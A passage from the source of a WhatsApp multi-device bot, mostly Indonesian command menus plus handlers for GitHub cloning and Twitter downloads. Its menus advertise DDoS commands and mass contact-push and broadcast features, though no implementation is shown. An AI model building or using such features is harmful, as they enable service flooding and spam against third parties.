│  ◦  .ꜱᴏᴜɴᴅ59
│  ◦  .ꜱᴏᴜɴᴅ60
│  ◦  .ꜱᴏᴜɴᴅ61
│  ◦  .ꜱᴏᴜɴᴅ62
│  ◦  .ꜱᴏᴜɴᴅ63
│  ◦  .ꜱᴏᴜɴᴅ64
│  ◦  .ꜱᴏᴜɴᴅ65
│  ◦  .ꜱᴏᴜɴᴅ66
│  ◦  .ꜱᴏᴜɴᴅ67
│  ◦  .ꜱᴏᴜɴᴅ68
│  ◦  .ꜱᴏᴜɴᴅ69
│  ◦  .ꜱᴏᴜɴᴅ70
│  ◦  .ꜱᴏᴜɴᴅ71
│  ◦  .ꜱᴏᴜɴᴅ72
│  ◦  .ꜱᴏᴜɴᴅ73
│  ◦  .ꜱᴏᴜɴᴅ74
│  ◦  .ꜱᴏᴜɴᴅ75
│  ◦  .ꜱᴏᴜɴᴅ76
│  ◦  .ꜱᴏᴜɴᴅ77
│  ◦  .ꜱᴏᴜɴᴅ78
│  ◦  .ꜱᴏᴜɴᴅ79
│  ◦  .ꜱᴏᴜɴᴅ80
│  ◦  .ꜱᴏᴜɴᴅ81
│  ◦  .ꜱᴏᴜɴᴅ82
│  ◦  .ꜱᴏᴜɴᴅ83
│  ◦  .ꜱᴏᴜɴᴅ84
│  ◦  .ꜱᴏᴜɴᴅ85
│  ◦  .ꜱᴏᴜɴᴅ86
│  ◦  .ꜱᴏᴜɴᴅ87
│  ◦  .ꜱᴏᴜɴᴅ88
│  ◦  .ꜱᴏᴜɴᴅ89
│  ◦  .ꜱᴏᴜɴᴅ90
│  ◦  .ꜱᴏᴜɴᴅ91
│  ◦  .ꜱᴏᴜɴᴅ92
│  ◦  .ꜱᴏᴜɴᴅ93
│  ◦  .ꜱᴏᴜɴᴅ94
│  ◦  .ꜱᴏᴜɴᴅ95
│  ◦  .ꜱᴏᴜɴᴅ96
│  ◦  .ꜱᴏᴜɴᴅ97
│  ◦  .ꜱᴏᴜɴᴅ98
│  ◦  .ꜱᴏᴜɴᴅ99
│  ◦  .ꜱᴏᴜɴᴅ100
│  ◦  .ꜱᴏᴜɴᴅ101
│  ◦  .ꜱᴏᴜɴᴅ102
│  ◦  .ꜱᴏᴜɴᴅ103
│  ◦  .ꜱᴏᴜɴᴅ104
│  ◦  .ꜱᴏᴜɴᴅ105
│  ◦  .ꜱᴏᴜɴᴅ106
│  ◦  .ꜱᴏᴜɴᴅ107
│  ◦  .ꜱᴏᴜɴᴅ108
│  ◦  .ꜱᴏᴜɴᴅ109
│  ◦  .ꜱᴏᴜɴᴅ110
│  ◦  .ꜱᴏᴜɴᴅ111
│  ◦  .ꜱᴏᴜɴᴅ112
│  ◦  .ꜱᴏᴜɴᴅ113
│  ◦  .ꜱᴏᴜɴᴅ114
│  ◦  .ꜱᴏᴜɴᴅ115
│  ◦  .ꜱᴏᴜɴᴅ116
│  ◦  .ꜱᴏᴜɴᴅ117
│  ◦  .ꜱᴏᴜɴᴅ118
│  ◦  .ꜱᴏᴜɴᴅ119
│  ◦  .ꜱᴏᴜɴᴅ120
│  ◦  .ꜱᴏᴜɴᴅ121
│  ◦  .ꜱᴏᴜɴᴅ122
│  ◦  .ꜱᴏᴜɴᴅ123
│  ◦  .ꜱᴏᴜɴᴅ124
│  ◦  .ꜱᴏᴜɴᴅ125
│  ◦  .ꜱᴏᴜɴᴅ126
│  ◦  .ꜱᴏᴜɴᴅ127
│  ◦  .ꜱᴏᴜɴᴅ128
│  ◦  .ꜱᴏᴜɴᴅ129
│  ◦  .ꜱᴏᴜɴᴅ130
│  ◦  .ꜱᴏᴜɴᴅ131
│  ◦  .ꜱᴏᴜɴᴅ132
│  ◦  .ꜱᴏᴜɴᴅ133
│  ◦  .ꜱᴏᴜɴᴅ134
│  ◦  .ꜱᴏᴜɴᴅ135
│  ◦  .ꜱᴏᴜɴᴅ136
│  ◦  .ꜱᴏᴜɴᴅ137
│  ◦  .ꜱᴏᴜɴᴅ138
│  ◦  .ꜱᴏᴜɴᴅ139
│  ◦  .ꜱᴏᴜɴᴅ140
│  ◦  .ꜱᴏᴜɴᴅ141
│  ◦  .ꜱᴏᴜɴᴅ142
│  ◦  .ꜱᴏᴜɴᴅ143
│  ◦  .ꜱᴏᴜɴᴅ144
│  ◦  .ꜱᴏᴜɴᴅ145
│  ◦  .ꜱᴏᴜɴᴅ146
│  ◦  .ꜱᴏᴜɴᴅ147
│  ◦  .ꜱᴏᴜɴᴅ148
│  ◦  .ꜱᴏᴜɴᴅ149
│  ◦  .ꜱᴏᴜɴᴅ150
│  ◦  .ꜱᴏᴜɴᴅ151
│  ◦  .ꜱᴏᴜɴᴅ152
│  ◦  .ꜱᴏᴜɴᴅ153
│  ◦  .ꜱᴏᴜɴᴅ154
│  ◦  .ꜱᴏᴜɴᴅ155
│  ◦  .ꜱᴏᴜɴᴅ156
│  ◦  .ꜱᴏᴜɴᴅ157
│  ◦  .ꜱᴏᴜɴᴅ158
│  ◦  .ꜱᴏᴜɴᴅ159
│  ◦  .ꜱᴏᴜɴᴅ160
│  ◦  .ꜱᴏᴜɴᴅ161
╰┈────────────────•

╭┈──────────────────
│ *${m2}[ ⏤͟͟͞͞  I S L A M - M E N U ‎ ͟͟͞͞⏤ ]${m2}*
╭┈──────────────────
│  ◦  .ᴋɪꜱᴀʜɴᴀʙɪ
│  ◦  .Qᴜᴏᴛᴇꜱɪꜱʟᴀᴍɪ
│  ◦  .ɴɪᴀᴛꜱʜᴏʟᴀᴛ
│  ◦  .ʙᴀᴄᴀᴀɴꜱʜᴏʟᴀᴛ
│  ◦  .ᴅᴏᴀʜᴀʀɪᴀɴ
│  ◦  .ᴀʏᴀᴛᴋᴜʀꜱɪ
╰┈────────────────•

╭┈──────────────────
│ *${m2}[ ⏤͟͟͞͞  T O O L S - M E N U ‎ ͟͟͞͞⏤ ]${m2}*
╭┈──────────────────
│  ◦  .ᴛᴛꜱ
│  ◦  .ʀᴇᴀᴅᴠᴏ
│  ◦  .ᴡᴀʟʟᴘᴀᴘᴇʀ
│  ◦  .ꜰʟᴀᴍɪɴɢ1
│  ◦  .ꜰʟᴀᴍɪɴɢ2
│  ◦  .ꜰʟᴀᴍɪɴɢ3
│  ◦  .ꜰʟᴀᴍɪɴɢ4
│  ◦  .ꜰʟᴀᴍɪɴɢ5
│  ◦  .ꜰʟᴀᴍɪɴɢ6
│  ◦  .ᴋᴏᴅᴇʙᴀʜᴀꜱᴀ
│  ◦  .ʀᴇᴍᴏᴠᴇʙɢ
│  ◦  .ᴛʀ
│  ◦  .ᴊᴀʀᴀᴋ
│  ◦  .ᴏᴄʀ
│  ◦  .ᴋᴀʟᴋᴜʟᴀᴛᴏʀ
│  ◦  .ɢᴇᴛ
│  ◦  .ʏᴛᴍᴘ3
│  ◦  .ʏᴛᴍᴘ4
│  ◦  .ᴛɪᴋᴛᴏᴋ
│  ◦  .ɪɢ
│  ◦  .ꜱᴘᴏᴛɪꜰʏ
│  ◦  .ᴍᴇᴅɪᴀꜰɪʀᴇ
│  ◦  .ɢᴅʀɪᴠᴇ
│  ◦  .ɢɪᴛᴄʟᴏɴᴇ
│  ◦  .ᴛᴡɪᴛᴛᴇʀ 
│  ◦  .ꜰʙ
│  ◦  .ᴏʙꜰᴜꜱ
╰┈────────────────•

╭┈──────────────────
│ *${m2}[ ⏤͟͟͞͞  D D O S - M E N U ‎ ͟͟͞͞⏤ ]${m2}*
╭┈──────────────────
│  ◦  .ᴅᴏᴡɴ1
│  ◦  .ᴅᴏᴡɴ2
╰┈────────────────•

╭┈──────────────────
│ *${m2}[ ⏤͟͟͞͞  S T I C K - M E N U ‎ ͟͟͞͞⏤ ]${m2}*
╭┈──────────────────
│  ◦  .ꜱᴛɪᴄᴋᴇʀ
│  ◦  .ᴄʟꜱ
│  ◦  .ꜱᴍᴇᴍᴇ 
│  ◦  .Qᴄ
│  ◦  .ꜱᴍᴇᴛᴀ
│  ◦  .ꜱᴛɪᴄᴋʜᴀɴᴅʜᴏʟᴅ 
│  ◦  .ꜱᴛɪᴄᴋꜱʜɪɴᴏʙᴜ 
│  ◦  .ꜱᴛɪᴄᴋᴄᴜᴅᴅʟᴇ 
│  ◦  .ꜱᴛɪᴄᴋʜɪɢʜꜰɪᴠᴇ 
│  ◦  .ꜱᴛɪᴄᴋᴅᴀɴᴄᴇ 
│  ◦  .ꜱᴛɪᴄᴋᴄʀɪɴɢᴇ 
│  ◦  .ꜱᴛɪᴄᴋʜᴀᴘᴘʏ 
│  ◦  .ꜱᴛɪᴄᴋɢʟᴏᴍᴘ 
│  ◦  .ꜱᴛɪᴄᴋꜱᴍᴜɢ 
│  ◦  .ꜱᴛɪᴄᴋʙʟᴜꜱʜ 
│  ◦  .ꜱᴛɪᴄᴋᴀᴡᴏᴏ 
│  ◦  .ꜱᴛɪᴄᴋᴡᴀᴠᴇ 
│  ◦  .ꜱᴛɪᴄᴋꜱᴍɪʟᴇ 
│  ◦  .ꜱᴛɪᴄᴋꜱʟᴀᴘ 
│  ◦  .ꜱᴛɪᴄᴋᴘᴏᴋᴇ 
│  ◦  .ꜱᴛɪᴄᴋᴡɪɴᴋ 
│  ◦  .ꜱᴛɪᴄᴋʙᴏɴᴋ 
│  ◦  .ꜱᴛɪᴄᴋʙᴜʟʟʏ 
│  ◦  .ꜱᴛɪᴄᴋʏᴇᴇᴛ 
│  ◦  .ꜱᴛɪᴄᴋʙɪᴋᴇ 
│  ◦  .ꜱᴛɪᴄᴋᴋɪꜱꜱ 
│  ◦  .ꜱᴛɪᴄᴋʟɪᴄᴋ 
│  ◦  .ꜱᴛɪᴄᴋᴘᴀᴛ 
│  ◦  .ꜱᴛɪᴄᴋʜᴜɢ 
│  ◦  .ꜱᴛɪᴄᴋᴋɪʟʟ 
│  ◦  .ꜱᴛɪᴄᴋᴄʀʏ 
│  ◦  .ꜱᴛɪᴄᴋꜱᴘᴀɴᴋ 
│  ◦  .ꜱᴛɪᴄᴋᴛɪᴄᴋʟᴇ 
│  ◦  .ᴋɪʟʟ
│  ◦  .ʜᴀɴᴅʜᴏʟᴅ
│  ◦  .ʜɪɢʜꜰɪᴠᴇ
│  ◦  .ᴄʀɪɴɢᴇ
│  ◦  .ᴅᴀɴᴄᴇ
│  ◦  .ʜᴀᴘᴘʏ
│  ◦  .ꜱᴍᴜɢ
│  ◦  .ɢʟᴏᴍᴘ
│  ◦  .ᴡᴀᴠᴇ
│  ◦  .ʙʟᴜꜱʜ 
│  ◦  .ꜱʟᴀᴘ
│  ◦  .ꜱᴍɪʟᴇ
│  ◦  .ᴘᴏᴋᴇ
│  ◦  .ɴᴏᴍ
│  ◦  .ᴡɪɴᴋ
│  ◦  .ʏᴇᴇᴛ
│  ◦  .ʙɪᴛᴇ
│  ◦  .ʙᴏɴᴋ
│  ◦  .ʟɪᴄᴋ
│  ◦  .ᴘᴀᴛ
╰┈────────────────•

╭┈──────────────────
│ *${m2}[ ⏤͟͟͞͞  T E M P - M E N U ‎ ͟͟͞͞⏤ ]${m2}*
╭┈──────────────────
│  ◦  .ᴛᴇᴍᴘ-ꜱᴛᴀʀᴛ 
│  ◦  .ᴛᴇᴍᴘ-ꜱᴛᴏᴘ
╰┈────────────────•

╭┈──────────────────
│ *${m2}[ ⏤͟͟͞͞  O W N - M E N U ‎ ͟͟͞͞⏤ ]${m2}*
╭┈──────────────────
│  ◦  .ᴘᴜʙʟɪᴄ
│  ◦  .ꜱᴇʟꜰ
│  ◦   $ 
│  ◦   =>
│  ◦   > 
│  ◦  .ᴀᴅᴅᴄᴀꜱᴇ
│  ◦  .ᴅᴇʟᴄᴀꜱᴇ
│  ◦  .ʟɪꜱᴛᴄᴀꜱᴇ
│  ◦  .ʀᴇꜱᴛᴀʀᴛ
│  ◦  .ꜱᴛᴏᴘ
│  ◦  .ʟɪꜱᴛᴄᴀꜱᴇ
│  ◦  .ɢᴇᴛꜱᴇꜱꜱɪᴏɴ
│  ◦  .ᴅᴇʟꜱᴇꜱꜱɪᴏɴ 
│  ◦  .ɢᴇᴛᴄᴀꜱᴇ
│  ◦  .ꜱᴇᴛʀᴇᴘʟʏ
│  ◦  .ꜱᴇᴛᴍᴇɴᴜ
│  ◦  .ɢᴇᴛꜰᴜɴᴄ
│  ◦  .ᴅᴇʟꜰɪʟᴇ
│  ◦  .ᴅᴇʟꜰᴏʟᴅᴇʀ
│  ◦  .ᴀᴅᴅꜱᴄʀᴀᴘᴇ
│  ◦  .ᴍᴜᴛᴇɢᴄ
│  ◦  .ʙʟᴏᴄᴋ
│  ◦  .ᴜɴʙʟᴏᴄᴋ
│  ◦  .ꜱᴇᴛᴘᴘʙᴏᴛ
│  ◦  .ᴅᴇʟᴘᴘʙᴏᴛ
│  ◦  .ꜱᴇᴛʙɪᴏʙᴏᴛ
│  ◦  .ᴊᴏɪɴ
│  ◦  .ᴀᴅᴅᴏᴡɴᴇʀ
│  ◦  .ᴅᴇʟᴏᴡɴᴇʀ
│  ◦  .ᴀᴅᴅᴘʀᴇᴍ
│  ◦  .ᴅᴇʟᴘʀᴇᴍ
│  ◦  .ʟɪꜱᴛᴘʀᴇᴍ
╰┈────────────────•

╭┈──────────────────
│ *${m2}[ ⏤͟͟͞͞  P R M B O N - M E N U ‎ ͟͟͞͞⏤ ]${m2}*
╭┈──────────────────
│  ◦  .ᴀʀᴛɪɴᴀᴍᴀ 
│  ◦  .ᴀʀᴛɪᴍɪᴍᴘɪ 
│  ◦  .ᴋᴇᴄᴏᴄᴏᴋᴀɴᴘᴀꜱᴀɴɢᴀɴ 
│  ◦  .ᴋᴇᴄᴏᴄᴏᴋᴀɴɴᴀᴍᴀ 
│  ◦  .ᴊᴀᴅɪᴀɴᴘᴇʀɴɪᴋᴀʜᴀɴ 
│  ◦  .ʀᴇᴊᴇᴋɪ 
│  ◦  .ꜱɪꜰᴀᴛᴜꜱᴀʜᴀ 
│  ◦  .ᴘᴇᴋᴇʀᴊᴀᴀɴ 
│  ◦  .ᴀʀᴛɪᴛᴀʀᴏᴛ 
│  ◦  .ᴘᴏᴛᴇɴꜱɪᴘᴇɴʏᴀᴋɪᴛ 
│  ◦  .ʀᴀᴍᴀʟᴀɴɴᴀꜱɪʙ 
│  ◦  .ʜᴀʀɪꜱᴀɴɢᴀʀ 
│  ◦  .ʜᴀʀɪʙᴀɪᴋ 
│  ◦  .ꜰᴇɴɢꜱʜᴜɪ 
│  ◦  .ɴᴀɢᴀʜᴀʀɪ
│  ◦  .ʜᴀʀɪɴᴀᴀꜱ 
│  ◦  .ᴡᴇᴛᴏɴ 
│  ◦  .ᴘᴇʀᴜɴᴛᴜɴɢᴀɴ 
│  ◦  .ᴀʀᴀʜʀᴇᴊᴇᴋɪ 
│  ◦  .ꜱɪꜰᴀᴛ 
│  ◦  .ᴋᴇʙᴇʀᴜɴᴛᴜɴɢᴀɴ 
│  ◦  .ᴍᴇᴍᴀɴᴄɪɴɢ 
│  ◦  .ᴍᴀꜱᴀꜱᴜʙᴜʀ 
│  ◦  .ᴢᴏᴅɪᴀᴋ 
│  ◦  .ꜱʜɪᴏ 
╰┈────────────────•

╭┈──────────────────
│ *${m2}[ ⏤͟͟͞͞  F U N - M E N U ‎ ͟͟͞͞⏤ ]${m2}*
╭┈──────────────────
│  ◦  .ᴄᴇᴋᴋʜᴏᴅᴀᴍ
│  ◦  .ʙɪꜱᴀᴋᴀʜ
│  ◦  .ɢɪᴍᴀɴᴀ
│  ◦  .ᴀᴘᴀᴋᴀʜ
│  ◦  .ᴋᴀᴘᴀɴᴋᴀʜ
│  ◦  .ᴡᴀᴛᴀᴋᴄᴇᴋ
│  ◦  .ʜᴏʙʙʏᴄᴇᴋ
│  ◦  .ᴄᴇᴋᴍᴇᴋɪ
│  ◦  .ᴄᴇʙᴇʟᴀᴘᴀɪᴍᴜᴛᴄɪᴀᴋᴜ
│  ◦  .ᴄᴇᴋᴍᴇ
│  ◦  .ᴄᴇᴋᴋᴏɴᴛᴏʟ
╰┈────────────────•

╭┈──────────────────
│ *${m2}[ ⏤͟͟͞͞  R P G - M E N U ‎ ͟͟͞͞⏤ ]${m2}*
╭┈──────────────────
│  ◦  .ꜱᴘɪɴ
│  ◦  .ʙᴇʀʙᴜʀᴜ
│  ◦  .ᴍɪɴɪɴɢ
│  ◦  .ɢʟᴏʙᴀʟ
│  ◦  .ᴜꜱᴇ-ᴘᴏᴡᴇʀ
│  ◦  .ꜱᴇʟʟ
│  ◦  .ɪɴᴠᴇɴᴛᴏʀʏ
│  ◦  .ʙᴜʏ
│  ◦  .ᴘʀᴏꜰɪʟᴇ
│  ◦  .ᴊᴏɪɴʀᴘɢ
│  ◦  .ᴇxɪᴛʀᴘɢ
│  ◦  .ᴄʀᴇᴀᴛᴇɢᴜɪʟᴅ
│  ◦  .ʟɪꜱᴛɢᴜɪʟᴅ
│  ◦  .ᴊᴏɪɴɢᴜɪʟᴅ
│  ◦  .ᴅᴇʟɢᴜɪʟᴅ
│  ◦  .ɢᴜɪʟᴅɪɴꜰᴏ
│  ◦  .ᴍʏɢᴜɪʟᴅ
│  ◦  .ʙᴀᴛᴛʟᴇ *<595xxx>*
│  ◦  .ᴀᴄᴄ-ʙᴀᴛᴛʟᴇ
│  ◦  .ʀᴇᴊᴇᴄ-ʙᴀᴛᴛʟᴇ
│  ◦  .ʟᴜᴄᴋʏᴅᴀʏ
│  ◦  .ᴅᴀɪʟʏ
│  ◦  .ᴡᴇᴇᴋʟʏ
│  ◦  .ʏᴇᴀʀʟʏ
│  ◦  .ᴍᴀɴᴄɪɴɢ
│  ◦  .ꜱᴇᴛɴᴀᴍᴇ
│  ◦  .ɢɪᴠᴇ-ꜰᴏᴏᴅ
│  ◦  .ʀᴇᴄᴏᴠᴇʀ
│  ◦  .ꜱʟᴇᴇᴘ
│  ◦  .ʙᴇʀᴍᴀɪɴ
│  ◦  .ʟᴀᴛɪʜ-ᴅɪɢɪᴍᴏɴ
│  ◦  .ᴍʏᴅɪɢɪ
│  ◦  .ᴄʜᴇᴀᴛ
│  ◦  .ᴄᴀʀɪ-ʀᴘɢ
│  ◦  .ᴍᴜꜱᴜʜ
│  ◦  .ᴍᴜʟᴜɴɢ
│  ◦  .ʜᴀᴜʟɪɴɢ
│  ◦  .ᴋᴜʀɪʀ
│  ◦  .ɢᴇᴛᴅɪɢɪ
│  ◦  .ʟᴀᴍᴀʀ-ᴋᴇʀᴊᴀ
│  ◦  .ᴏᴜᴛ-ᴋᴇʀᴊᴀ
│  ◦  .ᴘᴏʟɪꜱɪ
│  ◦  .ᴏᴊᴇᴋ
│  ◦  .ᴅᴏᴋᴛᴇʀ
│  ◦  .ᴘᴇᴛᴀɴɪ
│  ◦  .ᴘᴇɴᴅᴀɢᴀɴɢ
│  ◦  .ʟɪꜱᴛ-ꜱᴋɪʟ
│  ◦  .ᴅ-ᴛᴇʀᴍɪɴᴀʟ
│  ◦  .ᴅ3
│  ◦  .ʀᴜʟᴇꜱ-ʀᴘɢ
│  ◦  .ɢᴜɪᴅᴇ-ʀᴘɢ
╰┈────────────────•

╭┈──────────────────
│ *${m2}[ ⏤͟͟͞͞  P U S H - M E N U ‎ ͟͟͞͞⏤ ]${m2}*
╭┈──────────────────
│  ◦  .ᴄᴇᴋɪᴅɢᴄ
│  ◦  .ʟɪꜱᴛɢʀᴏᴜᴘ
│  ◦  .ᴘᴜꜱʜᴋᴏɴᴛᴀᴋᴠ1
│  ◦  .ᴘᴜꜱʜᴋᴏɴᴛᴀᴋᴠ2
│  ◦  .ᴘᴜꜱʜᴋᴏɴᴛᴀᴋᴠ3
│  ◦  .ᴘᴜꜱʜᴋᴏɴᴛᴀᴋᴠ4
│  ◦  .ꜱᴀᴠᴇᴄᴏɴᴛᴀᴄᴛᴠ1
│  ◦  .ꜱᴀᴠᴇᴄᴏɴᴛᴀᴄᴛᴠ2
│  ◦  .ɢᴇᴛᴄᴏɴᴛᴀᴄᴛ
│  ◦  .ꜱᴇɴᴅᴋᴏɴᴛᴀᴋ
│  ◦  .ᴊᴘᴍ
│  ◦  .ʙᴄɢᴄ
╰┈────────────────•

╭┈──────────────────
│ *${m2}[ ⏤͟͟͞͞  S E T - C M D ‎ ͟͟͞͞⏤ ]${m2}*
╭┈──────────────────
│  ◦  .ꜱᴇᴛᴄᴍᴅ
│  ◦  .ᴅᴇʟᴄᴍᴅ
│  ◦  .ʟɪꜱᴛᴄᴍᴅ
│  ◦  .ᴀᴅᴅᴘᴅꜰ
│  ◦  .ᴅᴇʟᴘᴅꜰ
│  ◦  .ʟɪꜱᴛᴘᴅꜰ
│  ◦  .ʏᴏᴘᴅꜰ
│  ◦  .ꜱᴇɴᴅᴘᴅꜰ
│  ◦  .ᴀᴅᴅᴢɪᴘ
│  ◦  .ᴅᴇʟᴢɪᴘ
│  ◦  .ʟɪꜱᴛᴢɪᴘ
│  ◦  .ʏᴏᴢɪᴘ
│  ◦  .ꜱᴇɴᴅᴢɪᴘ
│  ◦  .ᴀᴅᴅᴀᴘᴋ
│  ◦  .ᴅᴇʟᴀᴘᴋ
│  ◦  .ʟɪꜱᴛᴀᴘᴋ
│  ◦  .ʏᴏᴀᴘᴋ
│  ◦  .ꜱᴇɴᴅᴀᴘᴋ
│  ◦  .ᴀᴅᴅᴠɴ
│  ◦  .ᴅᴇʟᴠɴ
│  ◦  .ʟɪꜱᴛᴠɴ
│  ◦  .ᴀᴅᴅᴍꜱɢ
│  ◦  .ꜱᴇɴᴅʟɪꜱᴛ
│  ◦  .ʟɪꜱᴛᴍꜱɢ
│  ◦  .ᴅᴇʟᴍꜱɢ
│  ◦  .ɢᴇᴛᴍꜱɢ
╰┈────────────────•

  ⟢• ──────────────── •⟢
  |‎‎ ‎ ${m2}< ‎ ‎‎ ‎ ‎Ziyo Official ‎  ‎‎‎</>${m2}  
  ⟢• ──────────────── •⟢
 `
 
ptz.sendMessage(m.chat, {
document: fs.readFileSync("./package.json"),
fileName: 'Veemon MD - FDOC',
mimetype: 'application/msword',
jpegThumbnail:fs.readFileSync("./thum.jpg"),
caption: `${mnop0}`,
contextInfo: {
forwardingScore: 10,
 isForwarded: true,
forwardedNewsletterMessageInfo: {
            newsletterJid: '120363294187887035@newsletter',
            serverMessageId: null,
            newsletterName: '- Vemon • Chanels -'
        },
externalAdReply: {
showAdAttribution: true,
title: '⟡V E E M O N • M U L T I • D E V I C E⟡',
body: `x ᴛʜᴇᴍᴇ ᴅɪɢɪ ᴇᴠᴏ - ᴠᴇʀ` ,
thumbnail: fs.readFileSync('./zio.jpg'),
sourceUrl: '',
mediaType: 1,
renderLargerThumbnail: true 
}}}, {});
break
case "funmenu":
reply(`╭┈──────────────────
│ *${m2}[ ⏤͟͟͞͞  F U N - M E N U ‎ ͟͟͞͞⏤ ]${m2}*
╭┈──────────────────
│  ◦  .ᴄᴇᴋᴋʜᴏᴅᴀᴍ
│  ◦  .ʙɪꜱᴀᴋᴀʜ
│  ◦  .ɢɪᴍᴀɴᴀ
│  ◦  .ᴀᴘᴀᴋᴀʜ
│  ◦  .ᴋᴀᴘᴀɴᴋᴀʜ
│  ◦  .ᴡᴀᴛᴀᴋᴄᴇᴋ
│  ◦  .ʜᴏʙʙʏᴄᴇᴋ
│  ◦  .ᴄᴇᴋᴍᴇᴋɪ
│  ◦  .ᴄᴇʙᴇʟᴀᴘᴀɪᴍᴜᴛᴄɪᴀᴋᴜ
│  ◦  .ᴄᴇᴋᴍᴇ
│  ◦  .ᴄᴇᴋᴋᴏɴᴛᴏʟ
╰┈────────────────•

  ⟢• ──────────────── •⟢
  |‎‎ ‎ ${m2}< ‎ ‎‎ ‎ ‎Ziyo Official ‎  ‎‎‎</>${m2}  
  ⟢• ──────────────── •⟢`)
break
case "addmenu":
reply(`╭┈──────────────────
│ *${m2}[ ⏤͟͟͞͞  S E T - C M D ‎ ͟͟͞͞⏤ ]${m2}*
╭┈──────────────────
│  ◦  .ꜱᴇᴛᴄᴍᴅ
│  ◦  .ᴅᴇʟᴄᴍᴅ
│  ◦  .ʟɪꜱᴛᴄᴍᴅ
│  ◦  .ᴀᴅᴅᴘᴅꜰ
│  ◦  .ᴅᴇʟᴘᴅꜰ
│  ◦  .ʟɪꜱᴛᴘᴅꜰ
│  ◦  .ʏᴏᴘᴅꜰ
│  ◦  .ꜱᴇɴᴅᴘᴅꜰ
│  ◦  .ᴀᴅᴅᴢɪᴘ
│  ◦  .ᴅᴇʟᴢɪᴘ
│  ◦  .ʟɪꜱᴛᴢɪᴘ
│  ◦  .ʏᴏᴢɪᴘ
│  ◦  .ꜱᴇɴᴅᴢɪᴘ
│  ◦  .ᴀᴅᴅᴀᴘᴋ
│  ◦  .ᴅᴇʟᴀᴘᴋ
│  ◦  .ʟɪꜱᴛᴀᴘᴋ
│  ◦  .ʏᴏᴀᴘᴋ
│  ◦  .ꜱᴇɴᴅᴀᴘᴋ
│  ◦  .ᴀᴅᴅᴠɴ
│  ◦  .ᴅᴇʟᴠɴ
│  ◦  .ʟɪꜱᴛᴠɴ
│  ◦  .ᴀᴅᴅᴍꜱɢ
│  ◦  .ꜱᴇɴᴅʟɪꜱᴛ
│  ◦  .ʟɪꜱᴛᴍꜱɢ
│  ◦  .ᴅᴇʟᴍꜱɢ
│  ◦  .ɢᴇᴛᴍꜱɢ
╰┈────────────────•

  ⟢• ──────────────── •⟢
  |‎‎ ‎ ${m2}< ‎ ‎‎ ‎ ‎Ziyo Official ‎  ‎‎‎</>${m2}  
  ⟢• ──────────────── •⟢`)
break

case "primbon": case "primbo":
reply(`╭┈──────────────────
│ *${m2}[ ⏤͟͟͞͞  P R M B O N - M E N U ‎ ͟͟͞͞⏤ ]${m2}*
╭┈──────────────────
│  ◦  .ᴀʀᴛɪɴᴀᴍᴀ 
│  ◦  .ᴀʀᴛɪᴍɪᴍᴘɪ 
│  ◦  .ᴋᴇᴄᴏᴄᴏᴋᴀɴᴘᴀꜱᴀɴɢᴀɴ 
│  ◦  .ᴋᴇᴄᴏᴄᴏᴋᴀɴɴᴀᴍᴀ 
│  ◦  .ᴊᴀᴅɪᴀɴᴘᴇʀɴɪᴋᴀʜᴀɴ 
│  ◦  .ʀᴇᴊᴇᴋɪ 
│  ◦  .ꜱɪꜰᴀᴛᴜꜱᴀʜᴀ 
│  ◦  .ᴘᴇᴋᴇʀᴊᴀᴀɴ 
│  ◦  .ᴀʀᴛɪᴛᴀʀᴏᴛ 
│  ◦  .ᴘᴏᴛᴇɴꜱɪᴘᴇɴʏᴀᴋɪᴛ 
│  ◦  .ʀᴀᴍᴀʟᴀɴɴᴀꜱɪʙ 
│  ◦  .ʜᴀʀɪꜱᴀɴɢᴀʀ 
│  ◦  .ʜᴀʀɪʙᴀɪᴋ 
│  ◦  .ꜰᴇɴɢꜱʜᴜɪ 
│  ◦  .ɴᴀɢᴀʜᴀʀɪ
│  ◦  .ʜᴀʀɪɴᴀᴀꜱ 
│  ◦  .ᴡᴇᴛᴏɴ 
│  ◦  .ᴘᴇʀᴜɴᴛᴜɴɢᴀɴ 
│  ◦  .ᴀʀᴀʜʀᴇᴊᴇᴋɪ 
│  ◦  .ꜱɪꜰᴀᴛ 
│  ◦  .ᴋᴇʙᴇʀᴜɴᴛᴜɴɢᴀɴ 
│  ◦  .ᴍᴇᴍᴀɴᴄɪɴɢ 
│  ◦  .ᴍᴀꜱᴀꜱᴜʙᴜʀ 
│  ◦  .ᴢᴏᴅɪᴀᴋ 
│  ◦  .ꜱʜɪᴏ 
╰┈────────────────•

  ⟢• ──────────────── •⟢
  |‎‎ ‎ ${m2}< ‎ ‎‎ ‎ ‎Ziyo Official ‎  ‎‎‎</>${m2}  
  ⟢• ──────────────── •⟢`)
break

case "islammenu":
reply(`╭┈──────────────────
│ *${m2}[ ⏤͟͟͞͞  I S L A M - M E N U ‎ ͟͟͞͞⏤ ]${m2}*
╭┈──────────────────
│  ◦  .ᴋɪꜱᴀʜɴᴀʙɪ
│  ◦  .Qᴜᴏᴛᴇꜱɪꜱʟᴀᴍɪ
│  ◦  .ɴɪᴀᴛꜱʜᴏʟᴀᴛ
│  ◦  .ʙᴀᴄᴀᴀɴꜱʜᴏʟᴀᴛ
│  ◦  .ᴅᴏᴀʜᴀʀɪᴀɴ
│  ◦  .ᴀʏᴀᴛᴋᴜʀꜱɪ
╰┈────────────────•

  ⟢• ──────────────── •⟢
  |‎‎ ‎ ${m2}< ‎ ‎‎ ‎ ‎Ziyo Official ‎  ‎‎‎</>${m2}  
  ⟢• ──────────────── •⟢`)
break
      case 'git': case 'gitclone':
if (!args[0]) return m.reply(`Link Nya Mana Kak?\nContoh :\n${prefix}${command} Link Github`)
if (!isUrl(args[0]) && !args[0].includes('github.com')) return m.reply(`Link invalid!!`)
let regex1 = /(?:https|git)(?::\/\/|@)github\.com[\/:]([^\/:]+)\/(.+)/i
    let [, user, repo] = args[0].match(regex1) || []
    repo = repo.replace(/.git$/, '')
    let url = `https://api.github.com/repos/${user}/${repo}/zipball`
    let filename = (await fetch(url, {method: 'HEAD'})).headers.get('content-disposition').match(/attachment; filename=(.*)/)[1]
    ptz.sendMessage(m.chat, { document: { url: url }, fileName: filename+'.zip', mimetype: 'application/zip' }, { quoted: m }).catch((err) =>(err))
break

case 'twitter': case 'twitterdl': case 'twitterdl': {
	if (!args[0]) return reply(`📌 Example : \n*${prefix + command}* https://twitter.com/fernandavasro/status/1569741835555291139?t=ADxk8P3Z3prq8USIZUqXCg&s=19`)
	if (!isUrl(args[0]) && !args[0].includes('twitter.com')) return reply('Link Invalid!')
          try {
          let { SD, HD, desc, thumb, audio } = await fg.twitter(args[0])
          let te = ` 
┌─⊷ *TWITTER DL*
•°• Description: ${desc}
└───────────`
